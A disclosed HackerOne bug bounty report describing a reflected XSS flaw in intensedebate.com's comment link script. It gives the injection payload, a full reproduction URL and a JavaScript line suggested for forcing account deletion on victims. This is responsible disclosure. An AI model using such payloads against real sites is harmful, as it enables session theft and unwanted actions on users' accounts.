# Reflected XSS in https://www.intensedebate.com/js/getCommentLink.php

## Report Details
- **Report ID**: 1043804
- **URL**: https://hackerone.com/reports/1043804
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-11-26T03:44:11.410Z
- **Disclosed**: 2021-01-30T04:45:27.203Z

## Reporter
- **Username**: sudi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
Hey there,
I have found a reflected dom xss vulnerability in your website www.intensedebate.com, the *posttitle* parameter is vulnerable.

---------------------------------------------------------------------------------------------------------------------------------------------------


**Full url:** https://www.intensedebate.com/js/getCommentLink.php?acct=c90a61ed51fd7b64001f1361a7a71191&postid=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posturl=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posttitle=xss
**Parameter:** posttitle
**XSS Payload:** "><img src=x onerror=alert(1)>

---------------------------------------------------------------------------------------------------------------------------------------------------


**Steps to reproduce:**
Just load this url in your browser and you will get the xss popup

https://www.intensedebate.com/js/getCommentLink.php?acct=c90a61ed51fd7b64001f1361a7a71191&postid=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posturl=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posttitle=%3Cimg%20src=x%20onerror=alert(document.domain)%3E

---------------------------------------------------------------------------------------------------------------------------------------------------

**POC:**

{F1094491}

-----------------------------------------------------------------------------------------------------------------------------------------------------

## Impact

An attacker steal cookies of logged in users just by sending the url with the xss-payload, can redirect users to another websites,virtual defacement,etc.
Also Looking at the page: https://www.intensedebate.com/your-information, there are two actions available *Account Closure*, *Data export* with the xss we can perform this action on behalf of the user for eg:

```javascript
 document.getElementById('frm2').submit();
```
With a js code like this we can auto submit this  form so that when the user visits the url, his/her account will automatically will be deleted. 


Thankyou
Kind Regards
Sudhanshu

## Attachments
- firefox_I8GqvqVpkn.png
- gfig3x0YLW.mp4
